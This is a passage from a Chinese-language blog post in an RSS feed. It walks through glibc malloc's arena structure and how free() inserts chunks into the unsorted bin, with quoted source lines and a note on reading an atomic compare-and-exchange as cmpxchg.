class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line"><span class="number">1678</span>	<span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span></span></div><div class="line">1679	&#123;</div><div class="line"><span class="number">1680</span>	  <span class="comment">/* Serialize access.  */</span></div><div class="line"><span class="number">1681</span>	  __libc_lock_define (, mutex);</div><div class="line"><span class="number">1682</span>	</div><div class="line"><span class="number">1683</span>	  <span class="comment">/* Flags (formerly in max_fast).  */</span></div><div class="line"><span class="number">1684</span>	  <span class="keyword">int</span> flags;</div><div class="line"><span class="number">1685</span>	</div><div class="line"><span class="number">1686</span>	  <span class="comment">/* Fastbins */</span></div><div class="line"><span class="number">1687</span>	  mfastbinptr fastbinsY[NFASTBINS];</div><div class="line"><span class="number">1688</span>	</div><div class="line"><span class="number">1689</span>	  <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></div><div class="line"><span class="number">1690</span>	  mchunkptr top;</div><div class="line"><span class="number">1691</span>	</div><div class="line"><span class="number">1692</span>	  <span class="comment">/* The remainder from the most recent split of a small request */</span></div><div class="line"><span class="number">1693</span>	  mchunkptr last_remainder;</div><div class="line"><span class="number">1694</span>	</div><div class="line"><span class="number">1695</span>	  <span class="comment">/* Normal bins packed as described above */</span></div><div class="line"><span class="number">1696</span>	  mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];</div><div class="line"><span class="number">1697</span>	</div><div class="line"><span class="number">1698</span>	  <span class="comment">/* Bitmap of bins */</span></div><div class="line"><span class="number">1699</span>	  <span class="keyword">unsigned</span> <span class="keyword">int</span> binmap[BINMAPSIZE];</div><div class="line"><span class="number">1700</span>	</div><div class="line"><span class="number">1701</span>	  <span class="comment">/* Linked list */</span></div><div class="line"><span class="number">1702</span>	  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span></div><div class="line"><span class="number">1703</span>	</div><div class="line"><span class="number">1704</span>	  <span class="comment">/* Linked list for free arenas.  Access to this field is serialized</span></div><div class="line">1705	     by free_list_lock in arena.c.  */</div><div class="line"><span class="number">1706</span>	  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span></div><div class="line"><span class="number">1707</span>	</div><div class="line"><span class="number">1708</span>	  <span class="comment">/* Number of threads attached to this arena.  0 if the arena is on</span></div><div class="line">1709	     the free list.  Access to this field is serialized by</div><div class="line">1710	     free_list_lock in arena.c.  */</div><div class="line"><span class="number">1711</span>	  INTERNAL_SIZE_T attached_threads;</div><div class="line"><span class="number">1712</span>	</div><div class="line"><span class="number">1713</span>	  <span class="comment">/* Memory allocated from the system in this arena.  */</span></div><div class="line"><span class="number">1714</span>	  INTERNAL_SIZE_T system_mem;</div><div class="line"><span class="number">1715</span>	  INTERNAL_SIZE_T max_system_mem;</div><div class="line"><span class="number">1716</span>	&#125;;</div></pre></td></tr></table></figure>
<p>这是arena的结构体，其中fastbinsY数组存放的是fastbin，而bins数组中存放的是unsortbin，smallbin和largebin，其中bins[0]和bins[1]存放的是unsortbin。</p>
<p>在free函数中，free一个chunk，是把他放入到unsortbin之中。源代码中是这样的两句：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="number">4333</span>	      bck = unsorted_chunks(av);</div><div class="line"><span class="number">4334</span>	      fwd = bck-&gt;fd;</div></pre></td></tr></table></figure>
<p>链表插入的操作:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="number">4340</span>	      p-&gt;fd = fwd;</div><div class="line"><span class="number">4341</span>	      p-&gt;bk = bck;</div><div class="line">......</div><div class="line"><span class="number">4347</span>	      bck-&gt;fd = p;</div><div class="line"><span class="number">4348</span>	      fwd-&gt;bk = p;</div></pre></td></tr></table></figure>
<p>其中，bck的值为arena中top chunk的地址，fwd是bins[0]的值，arena的结构如下，</p>
<table>
<thead>
<tr>
<th style="text-align:center">top chunk</th>
<th style="text-align:center">last_remainder</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">bins[0]</td>
<td style="text-align:center">bins[1]</td>
</tr>
</tbody>
</table>
<p>上面这样的结构形成一个chunk和当前chunk形成一个双向循环链表</p>
<p>当largenbin的情况，会吧<code>fd_nextsize</code>和<code>bk_nextsize</code>置空(NULL)</p>
<p>最后就是设置当前chunk的inuse标志位和更新size，并设置下一个chunk的pre_size</p>
<p>所以chunk在进行free操作后，如果存在上一个chunk，肯定是处于inuse状态，如果不是上面就和当前chunk合并了，同理下一个也肯定是处于inuse状态的chunk</p>
<p>最后，当<code>size&gt;65536</code>时还会有一波猜测，大致过了一遍，是处理arena的，所以暂不做研究.</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这次看free代码虽然花了挺长时间，但是其实代码挺简单的，主要是三天打鱼两天晒网的缘故。最难看懂的代码应该是内联汇编了，比如这句：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="number">4255</span>	    <span class="keyword">while</span> ((old = catomic_compare_and_exchange_val_rel (fb, p, old2)) != old2);</div></pre></td></tr></table></figure>
<p>看了半天这内联汇编实在是难看，也不好理解，最后我把自己电脑上的libc.so，丢到ida中，找到这句对应的汇编，就好理解多了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cmpxchg [rdx], rbx</div></pre></td></tr></table></figure>
]]></content:encoded>
      
      <comments>http://0x48.pw/2017/08/07/0x37/#disqus_thread</comments>
    </item>
    
  </channel>
</rss>
